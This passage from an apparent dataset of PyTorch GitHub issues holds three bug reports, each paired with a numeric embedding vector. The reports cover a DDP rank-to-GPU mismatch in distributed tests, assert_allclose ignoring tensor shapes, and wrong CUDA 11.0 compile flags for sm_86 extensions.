 -0.00832373  0.29443824  0.12822941 -0.10590999  0.06577954 -0.00550733
  0.08968204  0.04762359  0.04192684  0.09542938  0.04176654 -0.3545723
  0.19802475  0.11253124 -0.37474692  0.07580437  0.16812119  0.10569465
 -0.35000318 -0.228041   -0.00429966  0.0856369   0.02391195  0.05877343
  0.04753811 -0.18082984 -0.06122379 -0.24262403 -0.15215118  0.11719584
 -0.16011472  0.08614357  0.05689953 -0.13371779 -0.17174767 -0.69717777
  0.33664548  0.10124656 -0.04592179 -0.0347339  -0.03559532 -0.00164194
  0.40137684 -0.1432532   0.10186926  0.06291369  0.1772505   0.16393405
  0.05351243  0.3265183   0.45482236  0.15985045  0.10776309  0.0291547
 -0.41445985 -0.17855233  0.24390662 -0.02731077 -0.40693992  0.03309858
 -0.06573758 -0.1792408  -0.02492072 -0.00899018 -0.02856997 -0.01944747
  0.17033255  0.04039333  0.20286624  0.1479167   0.1124317   0.04082734
  0.51063186 -0.13108552 -0.13658892  0.17256878  0.08918758  0.2020352
 -0.01918328 -0.21358779  0.01868574 -0.03491275  0.02791558 -0.19768335
  0.08614829  0.10622264 -0.13859487 -0.17584778  0.04975813  0.2045354
 -0.019839    0.06600924  0.06504072 -0.15548566  0.17643075  0.09545346
  0.10087101 -0.18345995 -0.03744356  0.01891346 -0.11935474 -0.00144024
  0.07660887 -0.19553918  0.20951742  0.18677819  0.2540994   0.00526294
  0.03561734 -0.08135065  0.17472774  0.17192006  0.05927663  0.07677331
 -0.06049642 -0.05281304  0.12668954  0.07393184 -0.45285     0.01638727
 -0.0182946  -0.00489554 -0.26499084  0.11730872 -0.03672099 -0.13296197
  0.08705044  0.09927442 -0.3544022   0.11903313 -0.01358048 -0.07597735
 -0.08474557 -0.03144324 -0.30580777  0.20790438  0.25920603  0.3384381
 -0.1242706   0.01337509  0.26959842 -0.43504012 -0.03255631  0.2746446
  0.1928274   0.08212665  0.06020207  0.09277876 -0.3852198  -0.13851973
 -0.04839846 -0.01142516  0.09372753 -0.04898058  0.02749785  0.069874
  0.26493374  0.00938452  0.02778049 -0.50205976 -0.26323634  0.2874773
  0.29299313  0.14173552 -0.15887134  0.0896272  -0.04313114  0.11871896
  0.24371974 -0.06086618  0.08875152  0.02655827 -0.1637497  -0.10943797
  0.14692491  0.01442609  0.02732383 -0.09522936  0.29597566  0.03339249
  0.2643469   0.16167757 -0.0519697   0.12778962  0.2201165  -0.07247794
  0.11312711 -0.03473851 -0.01793578 -0.3910236  -0.1609213   0.21543331
 -0.28932548 -0.43947124 -0.06055524 -0.0388897  -0.16752455  0.08317618
 -0.14611623  0.21444848  0.14051615 -0.14557059 -0.088673    0.05181071
 -0.00902595 -0.23234032  0.14460242  0.31847936  0.1841222  -0.19446726
  0.07704408  0.09261955 -0.01987182 -0.17627531  0.33891422  0.13591729
  0.0870937   0.25199583  0.44873154 -0.07981409  0.20214808  0.10575405
 -0.35413104 -0.27591407 -0.04494178 -0.09790139  0.17664322 -0.22362833
 -0.078517    0.03899899 -0.13839684  0.32818347 -0.32240987 -0.1686622
  0.3024941  -0.05200442  0.16506976  0.12012496 -0.19034734 -0.03070654
 -0.02727955  0.0297317   0.06615081  0.24330913 -0.00958579  0.305896
 -0.04731392  0.15123859 -0.3069644  -0.06958572  0.21350813 -0.34588128
  0.3293193  -0.36517116  0.24263577 -0.05646503  0.05385282  0.1691455
  0.54892063 -0.12367976  0.25396508  0.06036332 -0.0505368   0.19830322
  0.00356007  0.19669685  0.2322814  -0.06411258 -0.02439005 -0.18266656
 -0.28599778 -0.12522063 -0.02456746 -0.00780755  0.03277843 -0.06184206
 -0.29547855  0.30847603  0.1375746  -0.15602764  0.29642835 -0.15011838
 -0.05322189  0.2944401   0.24378486  0.04551256 -0.22449365  0.01177363
  0.0967551   0.00431793  0.2839135  -0.37206692  0.33620638  0.09117351
 -0.2295144   0.24639542 -0.17856742  0.05329955 -0.08767961  0.34637162
 -0.14960168 -0.01963017 -0.07928319 -0.2671262   0.09927598  0.04194574
  0.09675796 -0.09103379 -0.23132932 -0.12318564 -0.18444929 -0.06082776
  0.03312677 -0.03998166 -0.08298028  0.12982085 -0.22907135 -0.19776264
 -0.16560528  0.4180857  -0.06032004 -0.139999   -0.07997535 -0.39418197
  0.18787158 -0.3555263  -0.28470385 -0.09272879 -0.07170641  0.00895168
  0.09099182  0.21983823  0.16710709 -0.08349812 -0.3094953   0.11166288
 -0.2032475   0.28501046  0.05956421  0.16705492 -0.13334106  0.4180956
 -0.1366247  -0.02535383 -0.14432062 -0.1843152  -0.06588188 -0.08182731
 -0.10532863 -0.34396857 -0.00287591 -0.06371617 -0.04057039 -0.08897515
 -0.27416307  0.25719112  0.04179703  0.13211387  0.11415848  0.14497185
  0.10672243  0.0396655  -0.00337815  0.18113628 -0.15905765  0.02280057]"
DDP mismatch in rank to GPU selection oncall: distributed triaged module: ddp,"## ðŸ› Bug

Possible root cause for https://github.com/pytorch/pytorch/pull/45435.  CC @walterddr 
Thanks to @jaglinux for the following triage information.

For barrier call, all reduce uses tensor of device type cuda with the following formula:

`int16_t deviceIdx = static_cast<int16_t>(rank_ % numGPUs);`

https://github.com/pytorch/pytorch/blob/a49367e9c9fcfa9547782420a24441f13fef19dc/torch/lib/c10d/ProcessGroupNCCL.cpp#L1413

But when the tests are called, the tensors uses different formula to calculate rank to GPU selection.

https://github.com/pytorch/pytorch/blob/a49367e9c9fcfa9547782420a24441f13fef19dc/torch/testing/_internal/distributed/distributed_test.py#L367-L374

Hence for rank 0,1,2 ; barrier uses tensors of cuda0, cuda1, cuda2 device type and for testing, tensors of cuda0, cuda2, cuda4 are used.

If we change `rank_to_GPU` data structure in distributed_test.py to return `rank % numGPUs`. With this change, all the tests are passing.

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @SciPioneer @H-Huang @mrzzd",True,"[-4.24481034e-01 -8.35310221e-02 -8.29025507e-02 -2.97710210e-01
  1.38875470e-03 -2.04078287e-01 -1.13509648e-01  1.56891137e-01
 -2.72608578e-01 -2.06844091e-01  2.07671285e-01  2.55557075e-02
  1.84761375e-01 -7.67210871e-02 -1.04858130e-01  1.21449977e-01
 -2.76435286e-01  1.15498200e-01  2.23703668e-01  1.17594890e-01
 -6.03963397e-02  2.79131196e-02 -1.80295140e-01 -3.20258550e-04
  2.09468871e-01 -3.01722027e-02  1.47933453e-01 -4.28866483e-02
  1.29420787e-01 -6.93349987e-02  3.42548370e-01  3.97329390e-01
 -4.97287586e-02  1.13919042e-01  9.71853137e-02 -2.15706304e-01
 -2.77116954e-01 -3.43012065e-01  8.32984447e-02  1.12829983e-01
  7.38420635e-02 -5.70448525e-02  2.22055301e-01  2.76203692e-01
 -2.31114253e-01  4.40125614e-02 -1.82160333e-01  2.43747145e-01
 -1.72688857e-01 -3.01987469e-01  2.06323832e-01  4.59420234e-02
 -1.78858727e-01 -6.24337010e-02 -1.59770921e-01 -1.14189245e-01
  6.15875199e-02  2.71874703e-02 -9.67196450e-02  2.12478906e-01
  3.67965966e-01 -6.68084025e-02  1.48485869e-01  4.11133058e-02
  1.61995590e-01  1.49447799e-01  2.60579288e-01 -1.23178825e-01
  5.58027923e-01  4.97743636e-02  7.49047548e-02  1.07113846e-01
 -3.96544814e-01 -2.22555697e-01  1.22567922e-01 -2.27150321e-02
 -2.31793448e-01  2.55648017e-01  2.16079682e-01 -1.50186941e-01
 -1.37778252e-01  8.05750489e-02  1.12550810e-01 -1.65277809e-01
  1.87202543e-01 -2.07167521e-01  2.30775744e-01  9.56021175e-02
  1.63043082e-01 -3.63991633e-02  3.12926114e-01  2.20929384e-01
 -2.83235818e-01  1.55528262e-01  7.77497739e-02  1.79411992e-01
  1.11699358e-01 -3.12947869e-01 -1.30097911e-01  1.38373841e-02
 -1.85472205e-01 -1.64193183e-01 -3.14647079e-01  2.68881112e-01
 -1.33124232e-01 -1.06695317e-01  7.86520243e-02  2.02187315e-01
 -1.05000967e-02  1.70480996e-01  1.86973661e-01  1.12946585e-01
 -4.39760461e-03  2.75161684e-01 -1.14083387e-01  1.18639665e-02
  2.49049496e-02  5.47993034e-02 -7.31010139e-02 -2.98607722e-03
 -3.54060560e-01 -2.09657043e-01 -1.29296720e-01  2.19750240e-01
  1.38712347e-01  6.77478462e-02 -3.03363591e-01  7.08029792e-03
 -8.46442506e-02 -8.74579251e-02 -3.20045389e-02 -6.38096184e-02
  1.59450665e-01 -1.42881766e-01  9.53031331e-03  5.95819764e-02
 -4.17317957e-01 -1.08338073e-01 -3.58993411e-01 -1.25713885e-01
 -1.75023079e-01 -6.26127869e-02  1.35821169e-02 -8.15520436e-02
  1.31355420e-01  3.96238685e-01 -3.93694818e-01  4.63538170e-02
 -5.14585897e-02  7.67864063e-02 -1.08687468e-02  1.36953726e-01
 -2.05440223e-01  4.16620195e-01  6.30704463e-02 -5.36984988e-02
  4.05174732e-01 -6.79537207e-02  2.39118040e-01 -2.42828518e-01
  9.69745070e-02  3.87874544e-01  2.44164228e-01  2.04643697e-01
  2.02120811e-01  5.13323843e-02 -2.08260641e-01  4.75659892e-02
 -1.43014163e-01  2.01686233e-01 -3.54960449e-02 -1.16719864e-01
 -4.57549617e-02 -2.09786832e-01  2.14497164e-01 -2.21335530e-01
 -1.60916522e-01 -2.12455779e-01 -1.29214600e-01  1.94860682e-01
  4.03350182e-02  1.67730510e-01  3.60365331e-01  1.11537911e-01
  6.16320930e-02  5.87454699e-02  1.49209708e-01  1.32018894e-01
 -4.64905351e-01 -3.30712497e-01 -2.89620847e-01 -1.19960532e-01
  6.25108555e-02 -2.57425666e-01 -7.11655989e-02 -1.42507240e-01
  8.33771005e-02  3.86859924e-01  6.48367852e-02  2.01848045e-01
 -1.89375281e-01 -8.86800587e-02 -4.18038033e-02  1.08394191e-01
  1.04716659e-01  7.20480829e-02 -2.10446134e-01 -2.19573081e-01
 -2.30755880e-01  1.67842537e-01 -1.40402243e-01 -4.06889975e-01
 -2.70179778e-01 -2.27134585e-01 -3.92796576e-01  1.02720931e-02
  2.88440213e-02  3.76703516e-02  2.76888534e-02  2.88891554e-01
  6.42885491e-02 -1.06992841e-01 -1.31397992e-01 -1.52754039e-01
 -3.33159149e-01 -4.76027131e-02  1.31720662e-01 -1.50546543e-02
 -4.61817384e-02  1.37605779e-02 -1.92120537e-01 -7.69863278e-02
  2.93715298e-01  3.61485220e-02 -5.49774095e-02  2.00669274e-01
 -1.26566172e-01 -2.55196929e-01  1.37175724e-01  1.26918852e-01
  1.78782642e-03 -1.64264590e-01 -2.29106247e-01  3.32555771e-02
  2.53118992e-01  2.27439865e-01 -1.22268274e-01  9.69945416e-02
 -1.36497110e-01  2.05483675e-01 -7.53039420e-02 -1.24567583e-01
  1.76467657e-01 -3.41743678e-02  1.87163413e-01 -2.68070370e-01
 -3.18212509e-02 -5.57120740e-02 -1.52543545e-01 -4.00937125e-02
  2.74383515e-01  4.38235521e-01 -2.29047969e-01  4.27859128e-01
  2.57787108e-01  1.29168749e-01 -2.39872903e-01  1.26603603e-01
 -2.90186554e-02 -3.27090859e-01  3.09650660e-01 -2.06831366e-01
  1.94784105e-01 -1.34030003e-02  2.43417844e-01 -1.09840505e-01
  4.19577390e-01 -2.21603349e-01 -5.70013151e-02 -4.56986502e-02
 -8.80054198e-03  3.51636946e-01 -7.67729878e-02  1.32895261e-01
  2.39748687e-01 -3.54442775e-01 -1.19861916e-01 -4.24532890e-01
 -4.20567513e-01 -1.42990842e-01 -2.55020052e-01  5.00014238e-02
  6.83608577e-02  1.62880510e-01 -9.10378397e-02  1.70832708e-01
  1.63186997e-01 -5.08427657e-02  1.79038290e-02 -2.91572988e-01
 -2.15142637e-01  2.07513884e-01  1.31925061e-01 -1.97108388e-01
 -3.14892590e-01  1.81186497e-01 -7.33781457e-02  1.11904949e-01
  5.18065572e-01 -1.17424175e-01  1.49069339e-01  6.69650882e-02
  7.55239129e-02  1.01231873e-01 -3.27849448e-01  1.73752487e-01
 -2.88104117e-01  5.07272720e-01  1.23462893e-01  1.61928684e-01
  1.69281095e-01 -1.30775496e-01 -5.00329018e-01  1.66348875e-01
  3.93753529e-01  9.79607031e-02 -3.84748369e-01  9.02410001e-02
  6.38436377e-02  1.91470414e-01  1.12889275e-01  1.00909412e-01
  1.12560047e-02 -7.15008080e-02  5.21370098e-02 -1.53763011e-01
 -6.41137883e-02  9.77417380e-02  2.94754356e-02 -2.77481765e-01
 -4.53300059e-01 -1.13600828e-01  4.81239557e-02 -7.38467574e-02
 -1.39770344e-01  3.95342186e-02  3.25609088e-01  4.83436346e-01
  1.04876101e-01 -1.05485454e-01 -6.47199433e-03  5.71808219e-02
 -3.23379964e-01  3.77977192e-02  5.60631119e-02  4.31368649e-01
  6.10730518e-03  5.02971224e-02  3.89333665e-01  3.85472447e-01
 -3.32164437e-01 -9.51880217e-02 -2.66848624e-01 -1.18329730e-02
  5.18426485e-03 -3.38823013e-02  6.31280243e-02 -6.04109429e-02
  1.59887150e-01  3.87785643e-01 -2.63331354e-01 -7.37840384e-02
 -1.79728389e-01  5.30095212e-02  2.61099786e-02 -3.36872414e-02
  2.08333582e-01 -2.73727894e-01 -9.30852741e-02 -4.69954051e-02
 -2.28101343e-01 -3.11554790e-01  1.40339971e-01  5.56732528e-02]"
torch.testing.assert_allclose doesn't check shapes module: tests triaged module: testing,"## ðŸ› Bug
Tensors of different shapes can be considered `allclose`:
```python
import torch

# Two tensors of different shapes
A = torch.zeros((1, 1))
B = torch.zeros((1,))

torch.testing.assert_allclose(A, B) # passes
```

## Expected behavior

The numpy equivalent - which `assert_allclose` [was based on](https://github.com/pytorch/pytorch/pull/6200) - fails, as it should:
```python
import numpy as np

A = np.zeros((1, 1))
B = np.zeros((1,))

np.testing.assert_allclose(A, B) # fails
```

## Environment
```
Collecting environment information...
PyTorch version: 1.5.1
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.4 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.2.89
GPU models and configuration: 
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 440.100
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] numpy==1.18.5
[pip] pytorch-memlab==0.0.4
[pip] torch==1.5.1
[pip] torchvision==0.6.1
[conda] numpy                     1.18.5                   pypi_0    pypi
[conda] pytorch-memlab            0.0.4                    pypi_0    pypi
[conda] torch                     1.5.1                    pypi_0    pypi
[conda] torchvision               0.6.1                    pypi_0    pypi
```

## Additional context
The culprit is these two lines
```python
    if expected.shape != actual.shape:
        expected = expected.expand_as(actual)
```
in `assert_allclose`. This means it's obviously deliberate that shape's ignored, but the divergence from numpy is surprising. What's even more surprising is that it makes `assert_allclose` noncommutative:
```python
A = torch.zeros((1, 1))
B = torch.zeros((1,))

torch.testing.assert_allclose(A, B) # passes
torch.testing.assert_allclose(B, A) # fails
```
All in all I'm expecting a 'working as intended, #wontfix' here, which is fair enough. But I figured I'd open this issue to catch anyone else who's tripped up by this and goes a-Googling. 

cc @mruberry @VitalyFedyunin",True,"[-6.40018106e-01  3.07223499e-01 -1.11678928e-01  9.46076363e-02
 -9.87620503e-02 -4.60674822e-01  3.68822098e-01 -4.75424193e-02
 -5.22065043e-01 -2.74398983e-01 -5.11818826e-02 -3.30040574e-01
 -5.02433293e-02  3.38663995e-01 -4.90231514e-02 -6.15507811e-02
 -7.04117818e-03 -2.58637786e-01  3.80891636e-02 -2.56319225e-01
  4.15067971e-01 -5.64252585e-02 -6.76844548e-03  7.22529218e-02
 -8.47237855e-02  1.22698098e-01 -1.74446240e-01 -8.15413073e-02
  4.38956589e-01 -6.91071376e-02  8.69398564e-02 -1.28838301e-01
 -5.94591200e-01  3.16502899e-02 -9.27296281e-02 -6.27997220e-02
 -4.05026317e-01  6.57310709e-02 -1.34347618e-01 -2.41103351e-01
  2.21236143e-02  2.87434161e-01 -9.20189619e-02 -7.19501674e-02
  9.57203507e-02  8.25427473e-02 -8.50022808e-02  3.45347464e-01
 -2.48487949e-01 -1.29346490e-01  2.97753252e-02 -1.25916258e-01
 -2.46585220e-01 -5.13372183e-01  1.81631237e-01 -2.99983263e-01
 -1.31407827e-01 -1.18498117e-01  9.48728397e-02 -6.79260850e-01
  7.02651367e-02  1.96985751e-01  7.02118203e-02  4.92812917e-02
  8.90510380e-02  8.17876309e-02  1.13020435e-01  4.35583115e-01
  4.50782835e-01  4.14963722e-01  2.72944480e-01  1.86475873e-01
  1.90546051e-01  2.25318238e-01  1.08847111e-01  2.28750110e-01
 -3.70597064e-01  8.88967216e-02 -3.01811695e-01 -2.66150028e-01
 -4.80567291e-02 -6.96963817e-02  2.89091170e-01  1.90128982e-01
  4.34701741e-01  7.93637410e-02  2.66202569e-01  1.36384219e-01
  9.39711481e-02  3.68441939e-01 -1.68686569e-01  5.90679795e-02
 -2.75671542e-01  2.60701597e-01 -3.16717178e-02  2.49383345e-01
  1.97197825e-01 -7.55370632e-02  8.30758959e-02 -2.80806214e-01
  8.57729390e-02 -7.41510749e-01 -7.42174983e-02  3.06767464e-01
  3.82505119e-01  5.92829548e-02 -6.28205389e-02  1.25138253e-01
  5.19378424e-01 -1.91263124e-01  1.87846422e-01 -1.14906445e-01
  1.07522681e-01 -4.58719432e-02 -1.95886791e-01 -2.62690634e-01
 -2.35835165e-01 -5.72457947e-02  8.13026913e-03  4.51447368e-01
  9.70173627e-02  2.90946007e-01  1.38630301e-01  3.01190794e-01
  4.84189898e-01 -2.75972784e-02 -1.79250211e-01 -9.47877839e-02
 -9.24110711e-02  1.11111127e-01 -9.68431681e-02 -5.00407070e-02
 -1.71969816e-01  6.79320022e-02  5.96165538e-01  2.73373425e-01
 -5.10422766e-01  3.34159225e-01  6.24832921e-02 -2.91579142e-02
 -1.61679059e-01 -7.23700672e-02  1.43193468e-01 -6.20374419e-02
  2.37753049e-01 -3.89490724e-01 -4.25639987e-01  1.15656033e-01
 -1.44133484e-02 -6.82113245e-02 -3.11897602e-02  7.83901848e-03
 -3.26227903e-01  2.76467979e-01  7.74869397e-02 -8.75927880e-02
 -1.38904154e-01 -1.69026032e-02  2.37395123e-01 -6.10586047e-01
  1.16461284e-01  5.07317901e-01  1.52664825e-01 -1.85380355e-02
  1.68123409e-01  2.21387655e-01 -2.66339093e-01 -1.08784735e-02
 -4.44714010e-01 -3.47032025e-03  3.37634325e-01 -2.33785853e-01
 -3.28111313e-02  2.25095078e-04 -1.46108240e-01  1.32109001e-01
 -2.33869284e-01 -5.18864930e-01 -9.55994129e-02  3.98898423e-01
  2.95133114e-01  1.46987841e-01  1.53038487e-01  1.03063703e-01
 -2.85167634e-01  4.64116305e-01 -4.33666073e-03 -1.14162929e-01
  1.52043357e-01 -8.07127655e-02 -1.58534542e-01 -4.93554354e-01
 -3.12404215e-01  8.15066546e-02  7.74578676e-02  1.90093875e-01
 -5.93746454e-02 -3.40146542e-01 -2.56362498e-01 -1.66724399e-02
 -2.52754897e-01  5.80994263e-02 -7.57054090e-02 -2.72412151e-01
  2.78561234e-01 -6.11141883e-02  1.29376538e-03 -3.31595093e-01
 -2.66554561e-02  2.77492046e-01 -1.07823238e-01 -5.49288154e-01
 -5.38201869e-01 -2.65532374e-01  3.00182104e-01 -3.14993739e-01
  2.10207887e-02  2.34393626e-01 -1.79867446e-01  1.10454924e-01
  3.21412534e-01 -5.52883670e-02 -3.87818739e-02 -1.21101797e-01
 -8.59616324e-04  4.49686468e-01 -2.76897680e-02 -9.88646448e-02
 -1.67591125e-01  5.80572113e-02  1.75293684e-01 -3.40776742e-01
  1.73627257e-01 -5.43897599e-03  3.25968117e-01  2.36275226e-01
 -2.27347344e-01 -1.63545579e-01 -1.74009025e-01  1.68139994e-01
 -2.23499775e-01 -1.81381345e-01  3.29512745e-01 -1.32335171e-01
  6.15219995e-02  2.62529522e-01  1.03926748e-01 -2.07671493e-01
 -2.29716063e-01  1.19015440e-01 -1.10694557e-01 -1.38891593e-01
  2.68548042e-01  1.67025298e-01  2.60321021e-01  2.14223340e-01
  3.17633271e-01  8.50068219e-03 -1.94130063e-01 -2.45163828e-01
  3.17601562e-02  2.55386472e-01  7.77134225e-02  4.39260378e-02
  1.74978361e-01 -9.39364061e-02  1.20195523e-01  5.36072016e-01
  4.80225943e-02 -6.13950938e-02  5.62625378e-02 -3.64650041e-01
  2.65398532e-01 -2.17890456e-01  1.01942182e-01 -2.20674545e-01
  4.19188738e-01 -2.53201965e-02  1.12871967e-01 -1.80684552e-01
  3.12807083e-01 -6.02702722e-02 -9.30805653e-02  2.10791647e-01
  2.71054864e-01  2.53227111e-02  1.19254202e-01  4.51201648e-02
 -6.96547180e-02 -6.60123825e-02 -5.93955636e-01 -1.29738167e-01
  3.04555029e-01 -3.12411547e-01 -2.70907640e-01  4.81989682e-02
 -1.73444748e-01 -5.15169621e-01  1.62105590e-01  3.55379254e-01
 -9.95015055e-02  1.82790190e-01 -2.59164274e-02 -1.89001396e-01
 -6.92711920e-02 -1.93132922e-01  2.47996077e-01  3.76377031e-02
  1.02018341e-01 -4.74234909e-01  1.11855216e-01  7.72624612e-02
 -4.43606451e-03  4.46824223e-01  8.15672576e-02  2.66890764e-01
  1.52653962e-01  3.23566914e-01  9.50391963e-03  1.85028374e-01
 -1.83021784e-01 -6.60033941e-01  7.97249749e-03 -3.41252029e-01
 -2.88238108e-01  1.66460693e-01  1.66700080e-01  8.90498683e-02
 -4.16090131e-01 -9.79617760e-02 -2.26762146e-02 -2.12675214e-01
  9.14479345e-02 -6.91175610e-02 -7.86665455e-02 -3.72182518e-01
 -1.37942031e-01  4.17694211e-01  2.18467787e-04 -6.48130327e-02
 -5.12516916e-01 -2.56918579e-01 -1.03508353e-01 -2.12615162e-01
  6.11338019e-03 -1.12780280e-01  1.21093802e-01 -2.94131160e-01
  3.53723615e-02  1.50007810e-02  4.63459305e-02  3.49614210e-02
 -2.74090707e-01  3.39163601e-01  2.30524004e-01  2.78796375e-01
 -2.34776154e-01 -1.82023384e-02  8.54478031e-02  3.32500160e-01
 -5.47375064e-04  1.53553307e-01 -1.67320102e-01 -4.92734015e-02
  2.02846557e-01  3.81138660e-02  2.32423306e-01 -3.01054180e-01
  1.91054583e-01  3.27593237e-01 -1.03536025e-01  9.94624794e-02
 -2.86914349e-01  4.02843863e-01  3.46971154e-01 -2.15850286e-02
  3.92690629e-01 -1.36692375e-01  2.63663322e-01 -2.48248819e-02
  1.91803083e-01  1.84433490e-01  2.00066939e-01 -1.04124837e-01]"
CUDA 11.0 compilation flags incorrect for extensions module: build module: cuda triaged,"## ðŸ› Bug

CUDA11.0 does not support sm_86.

PyTorch by default uses the capability of device to compile extensions:
https://github.com/pytorch/pytorch/blob/996f444c007a89f7364ed03b7c24755f7ec43eb0/torch/utils/cpp_extension.py#L1424-L1427

Therefore, if a user uses CUDA11.0 pytorch binary on RTX30- GPUs, extension will be compiled with sm_86 and cause compilation error.


## Expected behavior

Extension be compiled with a capability of 8.0 instead.


cc @malfet @seemethere @walterddr @ngimel",True,"[-4.36862290e-01 -3.91316772e-01 -6.11675858e-01  2.12220728e-01
  3.93007509e-03 -1.84117049e-01 -2.37308636e-01  2.04211265e-01
 -6.11935675e-01 -1.82700798e-01  7.25669861e-02  4.20976877e-02
 -2.86699366e-02 -8.51476938e-02  1.20633736e-01  2.95137525e-01
 -9.66203362e-02  1.50812298e-01 -2.81729996e-01 -2.55788386e-01
 -1.16855778e-01  1.02817357e-01 -2.70424396e-01 -2.27960885e-01
  2.49114797e-01  8.70157629e-02 -1.23083986e-01 -5.57005048e-01
  9.45797861e-02  1.08649120e-01  3.59088123e-01  3.54241222e-01
 -1.26230940e-01  2.64279008e-01  2.54929602e-01  9.00129229e-02
 -3.46402019e-01 -2.13321447e-01  1.20717771e-01 -2.17493862e-01
 -3.40639591e-01 -4.16098014e-02 -1.11918285e-01  3.85934711e-02
 -4.27756697e-01 -3.82398188e-01 -1.14877507e-01  4.11223948e-01
 -1.54923856e-01  4.37837988e-02  1.02848768e-01 -2.42506713e-01
 -1.15981981e-01 -4.44634318e-01  1.92864180e-01  3.01877260e-02
 -2.28328511e-01  4.59284484e-01  9.84261632e-02  6.58738315e-02
  4.94908094e-01 -1.70006782e-01 -9.30752531e-02  1.24243364e-01
 -3.24446499e-01  1.81789473e-02 -4.98783588e-03 -1.42029583e-01
  5.44951916e-01 -1.55396432e-01 -1.80147752e-01  2.66957939e-01
 -2.57788837e-01 -2.90126801e-01  6.26095608e-02  1.05726555e-01
 -8.20759609e-02  2.84361780e-01 -1.23426899e-01  1.06173605e-01
  2.69912481e-01  2.82420479e-02  4.64239120e-02 -3.13893318e-01
  1.26111597e-01  6.27593622e-02  9.40494090e-02 -2.62650102e-02
  1.60815150e-01 -2.45638818e-01  4.47199732e-01  4.58766371e-02
  1.15152150e-01  3.14670324e-01 -3.96659747e-02  3.16905268e-02
  7.89523870e-02  4.75687012e-02 -3.39390427e-01 -3.25386941e-01
 -3.33566129e-01 -4.09496307e-01 -1.89061835e-01  6.43563151e-01
 -2.21182048e-01 -5.11527359e-01  1.11410856e-01  8.20607617e-02
 -5.56938350e-04 -1.25582427e-01  4.83018011e-01 -3.28764379e-01
 -2.58752983e-02 -3.37994508e-02  5.99881262e-02 -5.73035143e-03
 -3.98318619e-01 -3.40550959e-01 -6.77558333e-02  3.48678976e-02
 -4.17749882e-02  7.60668665e-02 -1.80313773e-02  9.68314186e-02
  2.04139605e-01  7.10778013e-02 -8.57006460e-02  9.99426544e-02
 -1.82571471e-01  1.94928244e-01  1.03366338e-01  1.08842753e-01
  3.46501946e-01 -9.24979895e-03 -2.12343968e-03  2.20374525e-01
 -4.88244295e-01 -2.37551212e-01 -1.47732586e-01 -1.53873011e-01
 -5.31072617e-02  1.81620136e-01  2.57334352e-01 -2.25186273e-01
  8.38270485e-02  3.44102502e-01 -8.49459320e-02  1.32510856e-01
 -7.72646070e-02  3.57032180e-01 -8.41989368e-02  1.09970011e-01
 -4.09190387e-01  7.10372210e-01  3.44777763e-01  2.18729615e-01
  4.14114952e-01 -4.10539806e-02  9.99936759e-02 -8.04028630e-01
  1.96060926e-01  6.62698746e-01  6.01310059e-02  1.08179107e-01
 -2.96137571e-01 -1.07417196e-01 -2.36970007e-01 -1.43937811e-01
 -6.19283542e-02  4.16705370e-01 -2.64733374e-01  6.57275692e-02
  4.77745831e-01 -3.95479023e-01  2.52325833e-01 -4.01339568e-02
  2.65409872e-02 -3.02176535e-01  1.55635431e-01  6.98718846e-01
  8.02935064e-02  5.77258945e-01  5.49629331e-01 -1.59744188e-01
  1.36800379e-01  4.74092007e-01  4.91688251e-01  8.87765586e-02
 -5.39436713e-02 -2.73336023e-01 -5.17412841e-01 -7.58947283e-02
 -9.95926037e-02 -3.20547044e-01  1.39772333e-03  5.54672219e-02
  2.35200211e-01  4.48226124e-01  2.68301070e-01  3.58492509e-02
 -2.73338199e-01  2.87520289e-01  3.37200940e-01  1.18762255e-01
  1.63833529e-01  1.73442155e-01 -2.19823390e-01 -2.60878503e-01
  8.41521472e-03  3.18555310e-02 -1.95714578e-01 -1.43218040e-01
 -2.70676374e-01 -2.88387954e-01 -4.26086247e-01  6.83855414e-01
  3.29388008e-02  1.62166819e-01 -8.96233767e-02  2.58921832e-01
  4.16190207e-01 -6.17548265e-02  1.13742962e-01 -3.64491880e-01
  4.05874401e-01 -1.21996716e-01  4.10821289e-02 -2.10711718e-01
  1.72029018e-01 -9.25289560e-03 -2.66312838e-01 -3.42175275e-01
  6.00373298e-02 -1.46343410e-01  2.54352950e-02  1.18954770e-01
 -1.39102731e-02 -8.73879269e-02  4.22039777e-02  2.77352214e-01
 -4.26659882e-01 -1.32762659e-02 -1.44031405e-01 -1.10748559e-01
  1.58828259e-01  2.74460077e-01 -5.53077012e-02 -2.25945041e-02
 -1.64166749e-01 -1.86761543e-01  2.05254585e-01 -5.13215661e-01
  7.96637684e-02  6.07129261e-02  8.52947012e-02 -3.16433191e-01
 -1.06234718e-02  1.01531327e-01 -1.33259431e-01 -8.69397745e-02
  2.32537061e-01  2.05159679e-01 -2.21595675e-01  2.23978043e-01
  1.07648056e-02  1.55339986e-01 -1.49785817e-01  3.99670392e-01
 -2.59077013e-01 -1.74625739e-01  1.61224723e-01 -1.41739875e-01
  3.27282488e-01 -3.72809589e-01  9.50257033e-02 -6.26069531e-02
  4.20986503e-01 -3.81355494e-01 -5.25938794e-02  1.46430761e-01
  1.36743024e-01  1.15044322e-02 -5.96441329e-02  1.78795144e-01
  2.81596780e-01 -3.39771807e-01 -7.26288185e-02 -2.19244301e-01
 -2.78052717e-01 -4.64447476e-02 -1.89485431e-01  3.49634171e-01
  9.19198096e-02 -1.56949043e-01 -2.06067607e-01  7.67163485e-02
 -2.09461406e-01  1.43042564e-01 -4.17380333e-02  5.35543822e-02
 -2.85886347e-01  1.01200514e-01  1.46825248e-02 -3.09691370e-01
 -3.47869933e-01 -2.45626062e-01 -4.09316234e-02  1.83306515e-01
  5.38282633e-01 -3.09255302e-01  1.97304443e-01  2.36527428e-01
 -6.07584752e-02  3.42528224e-01  1.73713155e-02 -1.76286995e-02
 -5.24643846e-02  4.37693983e-01  2.33364046e-01  1.19939029e-01
 -4.84931916e-01 -4.10468340e-01 -6.51916087e-01 -2.82702863e-01
